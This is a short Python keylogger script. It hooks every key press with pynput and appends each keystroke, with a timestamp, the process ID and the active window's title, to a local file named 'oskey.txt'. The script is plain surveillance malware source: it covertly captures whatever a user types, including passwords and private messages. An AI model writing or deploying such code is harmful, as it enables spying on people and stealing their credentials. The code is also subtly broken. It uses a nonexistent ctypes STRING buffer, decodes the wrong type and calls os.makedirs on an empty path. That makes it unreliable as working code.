import os
import time
from pynput import keyboard
from ctypes import windll, STRING, byref

# Define the log file path and filename
log_file = 'oskey.txt'

def get_window_title():
    """Retrieve the title of the active window."""
    hwnd = windll.user32.GetForegroundWindow()
    buffer = STRING(4096)
    windll.user32.GetWindowTextW(hwnd, buffer, 4096)
    return buffer.value.decode('utf-16le')

def write_to_log(key, window_title=''):
    """Log the keystroke and its associated window title."""
    with open(log_file, 'a', encoding='utf-8') as f:
        f.write(f'{time.strftime("%d-%m-%Y %H:%M:%S")} {os.getpid()}: {key}, Window Title: {window_title}\n')

def log_keystroke(k):
    """Log the keystroke and its associated window title."""
    write_to_log(k, get_window_title())

def main():
    # Create the directory to store logs if it doesn't exist
    os.makedirs(os.path.dirname(log_file), exist_ok=True)
    
    with open(log_file, 'w', encoding='utf-8') as f:
        f.write('Timestamp, Process ID, Keystroke, Window Title\n')

    # Hook the keyboard input to log keystrokes
    with keyboard.Listener(on_press=log_keystroke) as listener:
        listener.join()

if __name__ == "__main__":
    main()


